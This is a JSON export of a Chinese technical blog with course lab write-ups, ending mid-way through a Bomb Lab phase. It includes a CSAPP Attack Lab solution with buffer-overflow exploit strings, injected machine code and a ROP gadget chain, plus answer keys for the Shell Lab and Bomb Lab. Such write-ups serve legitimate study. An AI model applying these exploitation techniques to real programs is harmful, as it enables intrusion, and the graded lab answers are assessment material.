{"posts":[{"title":"CSAPP Attack Lab","text":"csapp AttackLab Phase 1首先获取 ctarget 的汇编代码 1objdump -d ctarget ctarget.s 查看getbuf函数,确定分配的空间 1234017a8: 48 83 ec 28 sub $0x28,%rsp4017ac: 48 89 e7 mov %rsp,%rdi4017af: e8 8c 02 00 00 call 401a40 &lt;Gets&gt; 发现分配了0x28 = 40字节的空间用于保存输入, 从而知道调用函数的返回地址是%rsp + 40处,只要将这个地址用touch1的地址覆盖,即可完成攻击 查看touch1的地址 100000000004017c0 &lt;touch1&gt;: 也就是在0x4017c0处所以得到我们的输入字符串为 12345600 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00c0 17 40 00 将其保存在phase1.txt中,进行测试 123456789$ ./hex2raw &lt;phase1.txt |./ctarget -qCookie: 0x59b997faType string:Touch1!: You called touch1()Valid solution for level 1 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00 Phase 2查看touch2的源代码 1234567void touch2(unsigned val) { vlevel = 2; if (val == cookie) { // ... } // ...} touch2与touch1不同之处在于前者接受一个无符号整数类型的参数, 而且要与cookie进行比较所以我们必须先把 cookie 的值传给参数 val, 根据x86-64惯例,也就是寄存器%rdi 123movq $0x59b997fa, %rdipushq $0x4017ec # touch2的地址ret 这里首先将cookie保存到%rdi中, 然后将touch2的地址压栈,最后返回.这样就可以跳转到touch2并将cookie传入参数将代码保存到文件phase2.s中, 然后转换成对应的机器码 12gcc -c phase2.sobjdump -d phase2.o &gt; phase2.byte 得到的机器码内容是 12340000000000000000 &lt;.text&gt;: 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 push $0x4017ec c: c3 ret 和phase1的思路相同,将这段代码保存在输入缓冲区中,然后覆盖返回地址即可执行,为此需要知道缓冲区的地址 1234567891011(gdb) disassembleDump of assembler code for function getbuf: 0x00000000004017a8 &lt;+0&gt;: sub $0x28,%rsp=&gt; 0x00000000004017ac &lt;+4&gt;: mov %rsp,%rdi 0x00000000004017af &lt;+7&gt;: call 0x401a40 &lt;Gets&gt; 0x00000000004017b4 &lt;+12&gt;: mov $0x1,%eax 0x00000000004017b9 &lt;+17&gt;: add $0x28,%rsp 0x00000000004017bd &lt;+21&gt;: retEnd of assembler dump.(gdb) display $rsp1: $rsp = (void *) 0x5561dc78 所以得到我们的输入为 12345648 c7 c7 fa 97 b9 59 68ec 17 40 00 c3 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0078 dc 61 55 将其保存在phase2.txt中, 进行测试 123456789$ ./hex2raw &lt;phase2.txt | ./ctarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 Phase 3首先， 看touch3的c代码 123456void touch3(char *sval){ vlevel=3; /* Partofvalidationprotocol */ if (hexmatch(cookie,sval)){ //... } touch3的参数是一个指针，指向了一个字符串, 然后调用hexmatch进行比较。所以可以得到下面的信息：传递给%rdi的值应该是cookie的地址，并且要以ASCII来表示 通过查表得到字符串的表示： 12// 0x59b997fa35 39 62 39 39 37 66 61 调用hexmatch前，位置0x5561dc78处的信息： 1234560x5561dc78: 0xb8c7c748 0x685561dc 0x004018fa 0x000000c30x5561dc88: 0xffffffff 0xffffffff 0xffffffff 0xffffffff0x5561dc98: 0x00401916 0x00000000 0x55586000 0x000000000x5561dca8: 0xffffffff 0xffffffff 0xffffffff 0xffffffff0x5561dcb8: 0x39623935 0x61663739 0xf4f4f400 0xf4f4f4f4 调用该函数后： 1234560x5561dc78: 0xb8c7c748 0x685561dc 0x5561dcb8 0x000000000x5561dc88: 0x55685fe8 0x00000000 0x00000002 0x000000000x5561dc98: 0x00401916 0x00000000 0x55586000 0x000000000x5561dca8: 0xffffffff 0xffffffff 0xffffffff 0xffffffff0x5561dcb8: 0x39623935 0x61663739 0xf4f4f400 0xf4f4f4f4 可以看到，输入被覆盖了， 所以不能将cookie保存在getbuf的栈中，同时也注意到地址a8后的内容没有被改变，所以可以将其保存在这个位置 这里保存在b8位置处, 汇编代码为 123movq $0x5561dcb8, %rdipushq $0x004018faret 最终的输入是 12345678948 c7 c7 b8 dc 61 55 68fa 18 40 00 c3 00 00 00ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff78 dc 61 55 00 00 00 00ff ff ff ff ff ff ff ffff ff ff ff ff ff ff ff35 39 62 39 39 37 66 61 测试 123456789$ ./hex2raw &lt; p3.txt |./ctarget -qCookie: 0x59b997faType string:Touch3!: You called touch3(&quot;59b997fa&quot;)Valid solution for level 3 with target ctargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:ctarget:3:48 C7 C7 B8 DC 61 55 68 FA 18 40 00 C3 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 78 DC 61 55 00 00 00 00 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF 35 39 62 39 39 37 66 61 Phase 4rtarget使用了两种技术防止缓冲区溢出攻击： 栈随机化 ：每一次运行栈的位置都不同，这样就不能找到注入代码的位置 限制可执行区域：栈为不可执行区域，一旦执行栈上的代码，就会出现段错误 攻击办法是利用已经存在的代码，而不是注入代码，这种方式称为ROP攻击按照 lab 要求，需要的代码位置在start_farm 和 end_farm之间 明白了上面的情况，就可以开始进行实验和Phase 2一样，仍然要将cookie放入%rdi中，根据实验给出的机器码，需要查找开头为48 89的指令， 且目的寄存器是%rdi满足条件的有： 123456789# 对应的指令地址是 4019a200000000004019a0 &lt;addval_273&gt;: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3对应的指令地址是 4019c500000000004019c3 &lt;setval_426&gt;: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 90是nop指令，不影响功能经查询后可以知道，这条指令是movq %rax, %rdi, 所以需要先将cookie保存到%rax要完成这一操作，需要先将cookie保存在栈上，然后弹出到%rax中，所以满足要求的指令是： 1popq %rax 对应的机器码是58, 查到的有： 123456789# 对应的指令地址是 4019ab00000000004019a7 &lt;addval_219&gt;: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 ret# 对应的指令地址是 4019cc00000000004019ca &lt;getval_280&gt;: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax 4019cf: c3 所以攻击的流程为：先执行构造出指令： 12popq %raxmovq %rax, %rdi 执行完后，然后跳转到touch2即可完成 所以输入的内容格式如下： 123456---- // getbuf的输入缓冲区---- // getbuf的输入缓冲区0x4019ab // 第一条指令的地址，这里选择满足要求的第一个0x59b997fa // cookie0x4019a2 // 第二条指令的地址，这里选择满足要求的第一个0x40184c // touch2的地址 最后的输入如下： 12345678900 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 0000 00 00 00 00 00 00 00ab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00a2 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00 测试： 123456789$ ./hex2raw &lt;p4.txt| ./rtarget -qCookie: 0x59b997faType string:Touch2!: You called touch2(0x59b997fa)Valid solution for level 2 with target rtargetPASS: Would have posted the following: user id bovik course 15213-f15 lab attacklab result 1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00","link":"/posts/a4b4efe7.html"},{"title":"CSAPP Shell Lab","text":"实验准备实验提供了一些结构体和函数 结构体 job_t首先是job_t，和保存job的数组jobs 1234567struct job_t { pid_t pid; int jid; int state; char cmdline[MAXLINE];};struct job_t jobs[MAXJOBS]; 有两个注意项 在实验中都需要小心维护jobs,原因是程序涉及到对这个数组并发操作 state保存这任务的状态:UNDEF,FG,BG,ST,由宏定义 辅助函数程序提供了下面一些辅助函数，可以用于任务相关的操作 12345678910void clearjob(struct job_t *job);void initjobs(struct job_t *jobs);int maxjid(struct job_t *jobs);int addjob(struct job_t *jobs, pid_t pid, int state, char *cmdline);int deletejob(struct job_t *jobs, pid_t pid);pid_t fgpid(struct job_t *jobs);struct job_t *getjobpid(struct job_t *jobs, pid_t pid);struct job_t *getjobjid(struct job_t *jobs, int jid);int pid2jid(pid_t pid);void listjobs(struct job_t *jobs); 例如，可以使用addjob添加一个任务到jobs数组中；可以使用fgpid通过pid获取任务的指针 main的主要逻辑12345678910111213int main(int argc, char **argv) { //... Signal(SIGINT, sigint_handler); Signal(SIGTSTP, sigtstp_handler); Signal(SIGCHLD, sigchld_handler); Signal(SIGQUIT, sigquit_handler); while (1) { eval(cmdline); } //...} 已经绑定了SIGINT, SIGTSTP, SIGCHLD, SIGQUIT这四个信号，除了最后一个外都需要实现信号处理函数 while 反复调用了eval函数，用于解析命令并交由对应的程序处理 实现这个lab, 要求实现下面七个函数： 12345678void eval(char *cmdline);int builtin_cmd(char **argv);void do_bgfg(char **argv);void waitfg(pid_t pid);void sigchld_handler(int sig);void sigint_handler(int sig);void sigtstp_handler(int sig); 最后三个是信号处理函数 eval有二个要求 如果是内建命令，立即执行，否则创建一个子进程执行 如果子进程需要前台执行，程序会等待其完成，否则不等待 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748 void eval(char *cmdline){ char *argv[MAXARGS]; char buf[MAXLINE]; int bg; pid_t pid; sigset_t mask_all, mask_one, prev_all, prev_one; sigemptyset(&amp;mask_one); sigaddset(&amp;mask_one,SIGCHLD); sigfillset(&amp;mask_all); strcpy(buf, cmdline); bg = parseline(buf, argv); int state = (bg == 1 ? BG: FG); if (argv[0] == NULL) { return; } if (!builtin_cmd(argv)) { sigprocmask(SIG_BLOCK, &amp;mask_one, &amp;prev_one); if ((pid = Fork()) == 0) { setpgid(0,0); sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); if (execve(argv[0], argv, environ) &lt; 0 ) { printf(&quot;%s Command not found\\n&quot;, argv[0]); exit(0); } } sigprocmask(SIG_BLOCK, &amp;mask_all, &amp;prev_all); addjob(jobs, pid, state, cmdline); // 可能添加失败 sigprocmask(SIG_SETMASK, &amp;prev_all, NULL); sigprocmask(SIG_SETMASK, &amp;prev_one, NULL); struct job_t* job = getjobpid(jobs, pid); if(!bg) { waitfg(pid); } else { printf(&quot;[%d] (%d) %s&quot;, job -&gt; jid, pid, cmdline); } } return;} builtin_cmd123456789101112131415161718int builtin_cmd(char **argv){ // quit, jobs, bg or fg if (!strcmp(&quot;quit&quot;, argv[0])) { exit(0); } if (!strcmp(&quot;bg&quot;, argv[0]) || !strcmp(&quot;fg&quot;, argv[0])) { do_bgfg(argv); return 1; } if (!strcmp(&quot;jobs&quot;, argv[0])) { listjobs(jobs); return 1; } return 0; /* not a builtin command */} do_bgfg1234567891011121314151617181920212223242526272829303132333435363738394041424344void do_bgfg(char **argv){ if (argv[1] == NULL) { printf(&quot;%s command requires PID or %%jobid argument\\n&quot;, argv[0]); return; } int state = strcmp(argv[0], &quot;bg&quot;) == 0? BG: FG; int id; struct job_t* job = NULL; if (argv[1][0] == '%') { if( sscanf(&amp;argv[1][1], &quot;%d&quot;, &amp;id) &gt; 0) { job = getjobjid(jobs, id); if (job == NULL) { printf(&quot;%%%d: No such job&quot;, id); return; } } }else if(sscanf(&amp;argv[1][0], &quot;%d&quot;, &amp;id) &gt; 0) { job = getjobjid(jobs, id); if (job == NULL) { printf(&quot;(%d): No such process\\n&quot;, id); return; } }else { printf(&quot;%s: argument must be a PID or %%jobid\\n&quot;,argv[0]); return; } sigset_t mask, prev; sigfillset(&amp;mask); sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev); job -&gt; state = state; kill(-(job -&gt; pid), SIGCONT); sigprocmask(SIG_SETMASK, &amp;prev, NULL); if (state == BG) { printf(&quot;[%d] (%d) %s&quot;, job -&gt; jid, job -&gt; pid, job -&gt; cmdline); }else{ waitfg(job -&gt; pid); } return;} waitfg12345678910void waitfg(pid_t pid){ sigset_t mask; sigemptyset(&amp;mask); while(fgpid(jobs) != 0) { sigsuspend(&amp;mask); } return;} sigchld_handler1234567891011121314151617181920212223242526272829void sigchld_handler(int sig){ pid_t pid; int status; int olderrno = errno; struct job_t * job = NULL; sigset_t mask, prev; sigfillset(&amp;mask); while ((pid = waitpid(-1, &amp;status, WNOHANG | WUNTRACED)) &gt; 0) { sigprocmask(SIG_BLOCK, &amp;mask, &amp;prev); if (WIFEXITED(status)) { // 正常终止 deletejob(jobs, pid); }else if (WIFSIGNALED(status)) { // 被信号终止 printf(&quot;Job [%d] (%d) terminated by signal %d\\n&quot;, pid2jid(pid), pid, WTERMSIG(status)); deletejob(jobs, pid); }else if (WIFSTOPPED(status)) { // 被信号停止 printf(&quot;Job [%d] (%d) stopped by signal %d\\n&quot;, pid2jid(pid), pid, WSTOPSIG(status)); job = getjobpid(jobs, pid); job -&gt; state = ST; } sigprocmask(SIG_SETMASK, &amp;prev, NULL); } errno = olderrno; return;} sigint_handler12345678void sigint_handler(int sig){ pid_t pid; if((pid = fgpid(jobs)) &gt; 0) { kill(-pid, sig); } return;} sigtstp_handler12345678void sigtstp_handler(int sig){ pid_t pid; if((pid = fgpid(jobs)) &gt; 0) { kill(-pid, sig); } return;}","link":"/posts/88ff41e9.html"},{"title":"cmu15455 project0 踩坑记录","text":"实验要求：24fall project 0 实验有两个任务：Task1: 实现一个基础的HyperLogLog，使用了稀疏布局，文件包括hyperloglog.h和hyperloglog.cppTask2: HyperLogLog_presto，使用了密集布局，文件包括hyperloglog_presto.h和hyperloglog_presto.cpp 环境配置我的实验环境为：windows11 + wsl + ubuntu24.04LTS + vscode 安装依赖按照实验指引，操作到如下命令的时候 12345678# Linuxsudo build_support/packages.sh# 结果Unsupported distribution 'LINUX'Please contact our support team for additional help.Be sure to include the contents of this message.Platform: Linux ll 5.15.167.4-microsoft-standard-WSL2 #1 SMP Tue Nov 5 00:21:55 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux 提示我们不支持的系统版本，解决办法可以参考下面的内容 找到这个 packages.sh文件,里面有如下的内容 123456789101141 LINUX)42 version=$(cat /etc/os-release | grep VERSION_ID | cut -d '&quot;' -f 2)43 case $version in44 18.04) install_linux ;;45 20.04) install_linux ;;46 22.04) install_linux ;;47 *) give_up ;;48 esac49 ;;5051 *) give_up ;; 按照实验指引, 只支持这三个版本的linux, 所以需要修改执行下面的命令 12cat /etc/os-release | grep VERSION_ID | cut -d '&quot;' -f 224.04 我的结果是24.04， 所以修改 packages.sh文件 123456 18.04) install_linux ;;45 20.04) install_linux ;;46 22.04) install_linux ;;46 24.04) install_linux ;;47 *) give_up ;;48 esac 当然也可以直接执行install_linux函数的命令，这个函数在文件的最下面然后重新安装依赖 12# Linuxsudo build_support/packages.sh 可能会出现找不到依赖的情况(时间过于久远，记不太清了)， 执行下面的命令 1sudo vim /etc/apt/sources.list 然后将下面的内容保存到文件中 12345678deb http://apt.llvm.org/noble/ llvm-toolchain-noble maindeb-src http://apt.llvm.org/noble/ llvm-toolchain-noble main# 19deb http://apt.llvm.org/noble/ llvm-toolchain-noble-19 maindeb-src http://apt.llvm.org/noble/ llvm-toolchain-noble-19 main# 20deb http://apt.llvm.org/noble/ llvm-toolchain-noble-20 maindeb-src http://apt.llvm.org/noble/ llvm-toolchain-noble-20 main 这里的内容取决于系统，如果和我的系统不一致，请参考llvm修改 再重新安装依赖 cmake构建继续按照实验指引 123mkdir buildcd buildcmake .. 可能会出现以下的输出 1234CMake Warning at CMakeLists.txt:52 (message): !! We recommend that you use clang-14 for developing BusTub. You're using Clang 21.0.0, a different version. 这个是因为实验要求的版本是clang-14,而我的是clang-21一个比较简单直接的方法是，找到仓库最外层的目录（例如我这里是bustub-private），这里有一个CMakeLists.txt文件，注释掉文件的51和52行 123456if(CMAKE_CXX_COMPILER_ID STREQUAL &quot;Clang&quot;) if(CMAKE_CXX_COMPILER_VERSION MATCHES &quot;^14.&quot;) message(STATUS &quot;You're using ${CMAKE_CXX_COMPILER_ID} ${CMAKE_CXX_COMPILER_VERSION}&quot;) # else() # message(WARNING &quot;!! We recommend that you use clang-14 for developing BusTub. You're using ${CMAKE_CXX_COMPILER_ID} ${CMAKE_CXX_COMPILER_VERSION}, a different version.&quot;) endif() 也可能有下面的输出 123456CMake Deprecation Warning at third_party/backward-cpp/CMakeLists.txt:23 (cmake_minimum_required): Compatibility with CMake &lt; 3.5 will be removed from a future version of CMake. Update the VERSION argument &lt;min&gt; value or use a ...&lt;max&gt; suffix to tell CMake that the project does not need compatibility with older versions. 这也是因为版本的问题，进入最外层目录的third_party目录，修改输出里面提到的第三方库的CMakeLists.txt里面的内容 1cmake_minimum_required(VERSION 3.5) 具体版本按照命令行输出修改然后在vscode安装插件，就可以愉快的进行实验了（笑 提交实验按照实验要求，需要提交一个压缩包 1make submit-p0 这个命令会将实验0打成一个压缩包，我这里是project0-submission.zip,在最外层目录这里也可能会出现问题，我完成实验时候，是做的2024fall学期，但是github仓库已经是2025spring版本了，导致压缩的文件不对。可以参考下面的方法解决 修改最外层CMakeLists.txt，修改262行的内容为 123456set(P0_FILES &quot;src/include/primer/hyperloglog.h&quot; &quot;src/include/primer/hyperloglog_presto.h&quot; &quot;src/primer/hyperloglog.cpp&quot; &quot;src/primer/hyperloglog_presto.cpp&quot;) 具体行数可能有变化，可以在文件中搜索P0_FILES来定位 接下来就是实验中遇到的问题了 bitset索引正常的数组,如[1,2,3,4,5],其索引从左到右依次增加 1234int nums[]{1,2,3,4,5}for (int i = 0; i &lt; 5; i++) { cout &lt;&lt; nums[i] &lt;&lt; &quot; &quot;;} 输入的结果为1 2 3 4 5 但是bitset的索引正好相反，最右侧的为0，最左侧的为size - 1比如[1000,1000], 按照索引从0开始遍历， 结果是 0001,0001 一些小细节还有的就是一些微不足道的小细节，需要动用我们脑中的灰色细胞（波洛语 Task2中，如果0的个数大于bashline,需要将其分成两部分保存，如何确定baseline关键在于dense_bucket_的容量，例如这里是#define DENSE_BUCKET_SIZE 4，4bit能表示最大的数为15，大于这个数的都需要分成两部分 计算求和的时候，需要将dense_bucket_和overflow_bucket_指定位置的值重新组合成0的个数 整体来说，实验内容不是很难，难度更大的地方在于环境的配置和c++语法以及题意的理解上以上，下个实验见","link":"/posts/43cd74e0.html"},{"title":"CSAPP Bomb Lab","text":"csapp BombLab 第一个炸弹使用 gdb 调试程序1gdb bomb 在 74 行处设置一个断点123438 char *input;......73 input = read_line(); /* Get input */74 phase_1(input); /* Run the phase */ 1break 74 运行该程序到断点位置执行disassemble命令 123 0x0000000000400e32 &lt;+146&gt;: call 0x40149e &lt;read_line&gt;=&gt; 0x0000000000400e37 &lt;+151&gt;: mov %rax,%rdi 0x0000000000400e3a &lt;+154&gt;: call 0x400ee0 &lt;phase_1&gt; 位置400e3a 执行call指令, 调用phase_1, 这个函数的参数是input, 也就是输入字符串的地址, 该函数调用前会将其值保存到%rdi寄存器, 对应位置400e37的指令 例如,输入的字符串是hello 12345(gdb) info registersrax 0x603780 6305664rsi 0x603780 6305664(gdb) x/s 63056640x603780 &lt;input_strings&gt;: &quot;hello&quot; 进入 phase_1函数内部12345678910111213(gdb) stepi0x0000000000400ee0 in phase_1 ()(gdb) disassembleDump of assembler code for function phase_1:=&gt; 0x0000000000400ee0 &lt;+0&gt;: sub $0x8,%rsp 0x0000000000400ee4 &lt;+4&gt;: mov $0x402400,%esi 0x0000000000400ee9 &lt;+9&gt;: call 0x401338 &lt;strings_not_equal&gt; 0x0000000000400eee &lt;+14&gt;: test %eax,%eax 0x0000000000400ef0 &lt;+16&gt;: je 0x400ef7 &lt;phase_1+23&gt; 0x0000000000400ef2 &lt;+18&gt;: call 0x40143a &lt;explode_bomb&gt; 0x0000000000400ef7 &lt;+23&gt;: add $0x8,%rsp 0x0000000000400efb &lt;+27&gt;: retEnd of assembler dump. 位置400ee4处的指令会将0x402400放入%esi中, 然后调用strings_not_equal函数函数执行完毕后, 会根据test %eax,%eax的结果进行跳转, 如果该寄存器的值为0则表示字符串相等phase_1调用结束,反之为1,表示字符串不等,跳转到400ef2调用explode_bomb,在屏幕上输出输出炸弹爆炸的信息 根据phase_1, 目标字符串保存在0x402400位置处, 输入的字符串的地址保存在%rsi中使用x/s address即可输出该位置的字符串 12(gdb) x/s 0x4024000x402400: &quot;Border relations with Canada have never been better.&quot; 拆弹123456$ ./bombWelcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!Border relations with Canada have never been better.Phase 1 defused. How about the next one? 第二个炸弹在第 82 行设置断点在代码中找到调用 phase_2 函数的行，并设置断点： 182 phase_2(input); 进入该函数后，反汇编： 123450x0000000000400efc &lt;+0&gt;: push %rbp0x0000000000400efd &lt;+1&gt;: push %rbx0x0000000000400efe &lt;+2&gt;: sub $0x28,%rsp0x0000000000400f02 &lt;+6&gt;: mov %rsp,%rsi0x0000000000400f05 &lt;+9&gt;: call 0x40145c &lt;read_six_numbers&gt; 在 0x400f05 位置调用了 read_six_numbers 函数。此时 %rdi 的值是 input 的地址，而 %rsi 的值是栈顶指针 %rsp 的值，即： 123(gdb) info registersrsi 0x7fffffffe400 140737488348160rdi 0x6037d0 6305744 分析 read_six_numbers 函数函数 read_six_numbers 的反汇编代码如下： 1234567891011121314(gdb) disassembleDump of assembler code for function read_six_numbers: 0x000000000040145c &lt;+0&gt;: sub $0x18,%rsp 0x0000000000401460 &lt;+4&gt;: mov %rsi,%rdx 0x0000000000401463 &lt;+7&gt;: lea 0x4(%rsi),%rcx 0x0000000000401467 &lt;+11&gt;: lea 0x14(%rsi),%rax 0x000000000040146b &lt;+15&gt;: mov %rax,0x8(%rsp) 0x0000000000401470 &lt;+20&gt;: lea 0x10(%rsi),%rax 0x0000000000401474 &lt;+24&gt;: mov %rax,(%rsp) 0x0000000000401478 &lt;+28&gt;: lea 0xc(%rsi),%r9 0x000000000040147c &lt;+32&gt;: lea 0x8(%rsi),%r8 0x0000000000401480 &lt;+36&gt;: mov $0x4025c3,%esi 0x0000000000401485 &lt;+41&gt;: mov $0x0,%eax 0x000000000040148a &lt;+46&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt; 该函数调用 sscanf 将输入解析为 6 个整数。其原型为： 1int sscanf(const char *str, const char *format, ...); 参数的映射如下： %rdi：输入字符串的地址 (input)。 %rsi：格式字符串地址 (&quot;%d %d %d %d %d %d&quot;，位于 0x4025c3)。 %rdx, %rcx, %r8, %r9：前四个整数的地址。 栈中保存剩余两个整数的地址 (%rsp+8 和 %rsp)。 输入数据最终被保存到以下地址： 123456rdx 0xe400rcx 0xe404r8 0xe408r9 0xe40c(%rsp) 0xe410(%rsp + 8) 0xe414 验证解析的整数数量是否为 6： 123450x000000000040148f &lt;+51&gt;: cmp $0x5,%eax0x0000000000401492 &lt;+54&gt;: jg 0x401499 &lt;read_six_numbers+61&gt;0x0000000000401494 &lt;+56&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000401499 &lt;+61&gt;: add $0x18,%rsp0x000000000040149d &lt;+65&gt;: ret 若解析的整数少于 6 个，会调用 explode_bomb 函数触发炸弹。注意：使用的是 jg 指令，因此解析的整数超过 6 个不会引发爆炸。 验证数据是否符合要求接着，phase_2 函数开始验证解析的数据是否符合要求。 验证第一个数是否为 11230x0000000000400f0a &lt;+14&gt;: cmpl $0x1,(%rsp)0x0000000000400f0e &lt;+18&gt;: je 0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;: call 0x40143a &lt;explode_bomb&gt; 若第一个数不等于 1，则触发炸弹。此时： 12(gdb) x/4x 0x7fffffffe4000x7fffffffe400: 0x01 0x00 0x00 0x00 第一个数为 1，符合要求。 验证后续数据如果第一个数正确，跳转到 0x400f30 进入循环： 1230x0000000000400f30 &lt;+52&gt;: lea 0x4(%rsp),%rbx0x0000000000400f35 &lt;+57&gt;: lea 0x18(%rsp),%rbp0x0000000000400f3a &lt;+62&gt;: jmp 0x400f17 &lt;phase_2+27&gt; 其中： %rbp = %rsp + 0x18：指向最后一个数的地址。 %rbx = %rsp + 0x4：指向第二个数的地址。 循环体代码如下： 123456780x0000000000400f17 &lt;+27&gt;: mov -0x4(%rbx),%eax0x0000000000400f1a &lt;+30&gt;: add %eax,%eax0x0000000000400f1c &lt;+32&gt;: cmp %eax,(%rbx)0x0000000000400f1e &lt;+34&gt;: je 0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;: call 0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;: add $0x4,%rbx0x0000000000400f29 &lt;+45&gt;: cmp %rbp,%rbx0x0000000000400f2c &lt;+48&gt;: jne 0x400f17 &lt;phase_2+27&gt; 将上一个数（%rbx-4）的值乘 2。 将结果与当前数（%rbx）比较，若不相等则触发炸弹。 将 %rbx 加 4，指向下一个数。 若未到达 %rbp（最后一个数），继续循环。 这一逻辑类似于以下 C 代码： 12345for (int i = 1; i &lt; 6; i++) { if (numbers[i] != 2 * numbers[i - 1]) { explode_bomb(); }} 正确输入经过分析，要求输入的 6 个整数是一个以 1 开始、每个数是前一个数的 2 倍的序列。正确输入为： 11 2 4 8 16 32 完整拆弹过程示例： 123456Welcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!Border relations with Canada have never been better.Phase 1 defused. How about the next one?1 2 4 8 16 32 a b cThat's number 2. Keep going! 第三个炸弹设置断点, 反汇编函数在 89 行处设置断点,进入phase_3函数, 反汇编该函数 第一部分: 1234567891011(gdb) disassembleDump of assembler code for function phase_3:=&gt; 0x0000000000400f43 &lt;+0&gt;: sub $0x18,%rsp 0x0000000000400f47 &lt;+4&gt;: lea 0xc(%rsp),%rcx 0x0000000000400f4c &lt;+9&gt;: lea 0x8(%rsp),%rdx 0x0000000000400f51 &lt;+14&gt;: mov $0x4025cf,%esi 0x0000000000400f56 &lt;+19&gt;: mov $0x0,%eax 0x0000000000400f5b &lt;+24&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt; 0x0000000000400f60 &lt;+29&gt;: cmp $0x1,%eax 0x0000000000400f63 &lt;+32&gt;: jg 0x400f6a &lt;phase_3+39&gt; 0x0000000000400f65 &lt;+34&gt;: call 0x40143a &lt;explode_bomb&gt; 会从输入中读入两个int类型的数据, 放入 %rsp + 0x8和%rsp + 0xc这两个位置 12(gdb) print $rsp$1 = (void *) 0x7fffffffe458 也就是 1234&gt;&gt;&gt; hex(0x7fffffffe458 + 0x8)'0x7fffffffe460'&gt;&gt;&gt; hex(0x7fffffffe458 + 0xc)'0x7fffffffe464' 第二部分 设第一个数为x 120x0000000000400f6a &lt;+39&gt;: cmpl $0x7,0x8(%rsp)0x0000000000400f6f &lt;+44&gt;: ja 0x400fad &lt;phase_3+106&gt; 根据上述汇编, x &lt;= 7 120x0000000000400f71 &lt;+46&gt;: mov 0x8(%rsp),%eax0x0000000000400f75 &lt;+50&gt;: jmp *0x402470(,%rax,8) 取出位置0x402470 + 8x的值,将其作为下一条指令的地址 123456&gt;&gt;&gt; hex(0x402470 + 0)'0x402470'&gt;&gt;&gt; hex(0x402470 + 8)'0x402478'&gt;&gt;&gt; hex(0x402470 + 16)'0x402480' 查看这些地址存放的值 12345(gdb) x/16x 0x4024700x402470: 0x00400f7c 0x00000000 0x00400fb9 0x000000000x402480: 0x00400f83 0x00000000 0x00400f8a 0x000000000x402490: 0x00400f91 0x00000000 0x00400f98 0x000000000x4024a0: 0x00400f9f 0x00000000 0x00400fa6 0x00000000 例如, 当x == 0时, 取出位置0x402470的值,也就是 0x00400f7c, 跳转到该地址, 执行以下指令 1234560x0000000000400f7c &lt;+57&gt;: mov $0xcf,%eax0x0000000000400f81 &lt;+62&gt;: jmp 0x400fbe &lt;phase_3+123&gt;...0x0000000000400fbe &lt;+123&gt;: cmp 0xc(%rsp),%eax0x0000000000400fc2 &lt;+127&gt;: je 0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;: call 0x40143a &lt;explode_bomb&gt; 这种情况下就会比较第二个数和0xcf是否相等 同理, 当x == 1时, 会测试第二个数是否等于0x137 拆弹: 12345678Welcome to my fiendish little bomb. You have 6 phases withwhich to blow yourself up. Have a nice day!Border relations with Canada have never been better.Phase 1 defused. How about the next one?1 2 4 8 16 32That's number 2. Keep going!0 207Halfway there! 第四个炸弹反汇编 phase_4函数12345678910111213141516...0x0000000000401024 &lt;+24&gt;: call 0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000401029 &lt;+29&gt;: cmp $0x2,%eax0x000000000040102c &lt;+32&gt;: jne 0x401035 &lt;phase_4+41&gt;...0x000000000040102e &lt;+34&gt;: cmpl $0xe,0x8(%rsp)0x0000000000401033 &lt;+39&gt;: jbe 0x40103a &lt;phase_4+46&gt;0x0000000000401035 &lt;+41&gt;: call 0x40143a &lt;explode_bomb&gt;...0x0000000000401048 